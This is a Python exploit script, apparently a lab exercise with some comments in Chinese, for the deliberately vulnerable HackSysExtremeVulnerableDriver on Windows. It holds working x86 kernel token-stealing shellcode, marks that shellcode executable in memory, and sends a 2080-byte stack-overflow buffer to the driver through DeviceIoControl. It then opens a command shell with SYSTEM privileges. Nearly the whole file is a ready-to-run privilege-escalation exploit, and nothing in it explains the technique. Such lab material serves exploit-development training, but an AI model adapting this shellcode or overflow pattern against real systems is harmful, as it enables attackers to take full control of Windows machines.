# coding=UTF-8
import sys
import struct
from ctypes import *
from subprocess import *
kernel32 = windll.kernel32

def open_driver():
    hevd = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 
                                0xC0000000, # 1100 0000 读取方式 READ / Write
                                0, # 共享模式 No Sharing
                                None, # 安全属性 No Security, NULL
                                0x3, # 0011 只读和隐藏属性
                                0, 
                                None) # NULL
    if(hevd == -1 or not hevd ):
        print("[-] Failed to open hevd")
        exit(-1)
    else:
        print("[+] Sucessful open hevd")
    return hevd

def pwn(hevd):
    shellcode = bytearray(
    "\x60"                            # pushad
    "\x31\xc0"                        # xor eax,eax
    "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    "\x8b\x40\x50"                    # mov eax,[eax+0x50]
    "\x89\xc1"                        # mov ecx,eax
    "\xba\x04\x00\x00\x00"            # mov edx,0x4
    "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    "\x75\xed"                        # jnz 0x1a
    "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    "\x61"                            # popad
    "\x5d"
    "\xc2\x08\x00")

    print("[*] Allocating shellcode character array...")
    userbuffer_addr = (c_char * len(shellcode)).from_buffer(shellcode)
    ptr = addressof(userbuffer_addr)

    print("[*] Marking shellcode RWX...")
    
    result = kernel32.VirtualProtect(
        userbuffer_addr,
        c_int(len(shellcode)),
        c_int(0x40),
        byref(c_ulong())
    )

    if result != 0:
        print("[+] Successfully marked shellcode RWX.")
    else:
        print("[-] Failed to mark shellcode RWX.")
        exit(-1)

    payload = struct.pack("<L",ptr)

    buf = "A" * 2080
    buf += payload
    buf_length = len(buf)
    
    print("[*] Sending payload to driver...")
    result = kernel32.DeviceIoControl(
        hevd,
        0x222003,
        buf,
        buf_length,
        None,
        0,
        byref(c_ulong()),
        None
    )

    if result != 0:
        print("[+] Payload sent.")
    else:
        print("[-] Unable to send payload to driver.")
        exit(-1)

    try:
        print("[*] Spawning cmd shell with SYSTEM privs...")
        Popen(
            'start cmd',
            shell=True
        )
    except:
        print("[-] Failed to spawn cmd shell.")
        exit(-1)


if __name__ == "__main__":
    hevd = open_driver()
    pwn(hevd)